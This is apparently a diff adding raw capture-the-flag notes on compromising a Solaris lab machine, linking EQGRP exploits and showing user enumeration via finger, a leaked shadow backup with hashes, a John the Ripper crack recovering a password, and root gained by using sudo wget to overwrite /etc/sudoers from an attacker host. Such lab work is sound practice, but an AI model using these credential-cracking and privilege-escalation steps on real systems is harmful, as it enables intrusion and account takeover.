@@ -1,0 +1,89 @@
+https://www.exploit-db.com/exploits/41871/
+
+
+https://github.com/x0rz/EQGRP/blob/master/Linux/bin/ebbisland
+https://github.com/x0rz/EQGRP/blob/master/Linux/doc/old/etc/user.tool.ebbisland.COMMON
+https://www.theregister.co.uk/2017/04/11/solaris_shadow_brokers_nsa_exploits/
+
+79, 
+111
+
+nmap enumare users from finger:
+sammy, sunny
+
+
+22022/tcp open  ssh     syn-ack ttl 64 SunSSH 1.3 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 d2:e5:cb:bd:33:c7:01:31:0b:3c:63:d9:82:d9:f1:4e (DSA)
+| ssh-dss AAAAB3NzaC1kc3MAAACBAKQhj2N5gfwsseuHbx/yCXwOkphQCTzDyXaBw5SHg/vRBW9aYPsWUUV0XGZPlVtbhxFylTZGNZTWJyndzQL3aRcQNouwVH8NnQsT63s4uLKsAP3jx4afAwB7049PvisAxtDVMbqg94vxaJkh88VY/EMpASYNrLFtr1mZngrbAzOvAAAAFQCiLK6Oh21fvEjgZ0Yl0IRtONW/wwAAAIAxz1u+bPH+VE7upID2HEvYksXOItmohsDFt0oHmGMHf9TKwZvqQLZRix0eXYu8zLnTIdg7rVYSjGyRhuWeIkl1+0aIJL4/dzB+JthInTGFIngc83MtonLP4Sj3YL20wL9etVh8/M0ZOedntWrQcUW+8cUWZRlgW8q620HZKE8VqAAAAIB0s8wn1ufviVEKXct60uz2ZoduUgg07dfPfzvhpbw232KYUJ6lchTj2p2AV8cD0fk2lok2Qc6Kn/OKSjO9C0PlvG8WWkVVvlISUY4BEhtqtL3aof7PYp5nCrLK+2v+grCLxOvyYpT1OfDMQbahOWGZ9OCwQtQXKP1wYEQMqMsSRg==
+|   1024 e4:2c:80:62:cf:15:17:79:ff:72:9d:df:8b:a6:c9:ac (RSA)
+|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAIEAxAwq7HNZXHr7XEeYeKsbnaruPQyUK5IkSE/FxHesBaKQ37AsLjw8iacqUvcs8IuhPfiTtwuwU42zUHu1e1rmLpRlMyLQnjgJH1++fP5E0Qnxj4DrFr7aeRv1FqPkrnK/xCX46AdgUhs4+4YA04yfi8pOlaSEVucYaqWNhuqJkt8=
+
+
+
+sunny@sunday:/$ ls -altr backup/
+total 5
+drwxr-xr-x  2 root root   4 2018-04-15 20:44 .
+-rw-r--r--  1 root root 319 2018-04-15 20:44 shadow.backup
+-r-x--x--x  1 root root  53 2018-04-24 10:35 agent22.backup
+drwxr-xr-x 26 root root  27 2018-04-24 12:57 ..
+sunny@sunday:/$ cat backup/shadow.backup 
+mysql:NP:::::::
+openldap:*LK*:::::::
+webservd:*LK*:::::::
+postgres:NP:::::::
+svctag:*LK*:6445::::::
+nobody:*LK*:6445::::::
+noaccess:*LK*:6445::::::
+nobody4:*LK*:6445::::::
+sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
+sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
+
+
+john --format=sha256crypt --wordlist=/usr/share/wordlists/rockyou.txt sammy.hash 
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha256crypt, crypt(3) $5$ [SHA256 128/128 AVX 4x])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:04 0.04% (ETA: 18:54:28) 0g/s 1607p/s 1607c/s 1607C/s bethan..emoemo
+0g 0:00:00:06 0.06% (ETA: 19:01:21) 0g/s 1589p/s 1589c/s 1589C/s sandara..1asshole
+0g 0:00:00:11 0.11% (ETA: 19:06:12) 0g/s 1583p/s 1583c/s 1583C/s beautyqueen..852123
+0g 0:00:00:12 0.11% (ETA: 19:07:15) 0g/s 1579p/s 1579c/s 1579C/s leonardo1..lovegod1
+0g 0:00:00:13 0.12% (ETA: 19:08:14) 0g/s 1572p/s 1572c/s 1572C/s sayangkamu..041092
+0g 0:00:00:14 0.13% (ETA: 19:09:01) 0g/s 1569p/s 1569c/s 1569C/s travon..159875321
+0g 0:00:00:15 0.14% (ETA: 19:09:48) 0g/s 1564p/s 1564c/s 1564C/s hotmom..sentra
+0g 0:00:00:23 0.21% (ETA: 19:10:52) 0g/s 1580p/s 1580c/s 1580C/s holabebe..251093
+0g 0:00:00:24 0.22% (ETA: 19:11:13) 0g/s 1576p/s 1576c/s 1576C/s jonah1..anthony02
+0g 0:00:00:25 0.23% (ETA: 19:11:35) 0g/s 1574p/s 1574c/s 1574C/s promo2007..gillespie
+0g 0:00:00:26 0.24% (ETA: 19:12:58) 0g/s 1567p/s 1567c/s 1567C/s cole123..180993
+0g 0:00:01:20 0.73% (ETA: 19:13:57) 0g/s 1555p/s 1555c/s 1555C/s duchesse..cutekim
+0g 0:00:01:21 0.74% (ETA: 19:13:57) 0g/s 1554p/s 1554c/s 1554C/s MIKE..890825
+cooldude!        (sammy)
+
+sudo -l
+sammy.. 
+
+sudo /usr/bin/wget -O /etc/sudoers 10.10.14.44:6544/sudo-modded
+
+root@sunday:/root# ls -altr                                                                                                     
+total 18
+-rw-r--r--  1 root root  611 2009-05-14 21:18 .profile
+-rw-r--r--  1 root root  280 2009-05-14 21:18 .bashrc
+drwx------  3 root root    3 2018-04-15 20:22 .config
+-rw-------  1 root root 1365 2018-04-15 20:23 .recently-used.xbel
+drwx------  2 root root    3 2018-04-15 20:23 .gconfd
+drwx------  3 root root    3 2018-04-15 20:30 .sunw
+-r--------  1 root root   33 2018-04-15 20:38 root.txt
+drwx------  3 root root    3 2018-04-24 09:30 .gconf
+drwx------  6 root root   13 2018-04-24 10:31 .
+-rw-------  1 root root   53 2018-04-24 10:35 troll.original
+-rwx------  1 root root  112 2018-04-24 10:48 overwrite
+drwxr-xr-x 26 root root   27 2018-04-24 12:57 ..
+-r-x--x--x  1 root root   53 2018-05-04 06:55 troll
+root@sunday:/root# cat troll                                                                                                    
+#!/usr/bin/bash
+
+/usr/bin/echo "testing"
+/usr/bin/id
+root@sunday:/root# cat root.txt                                                                                                 
+fb40fab61d99d37536daeec0d97af9b8
+
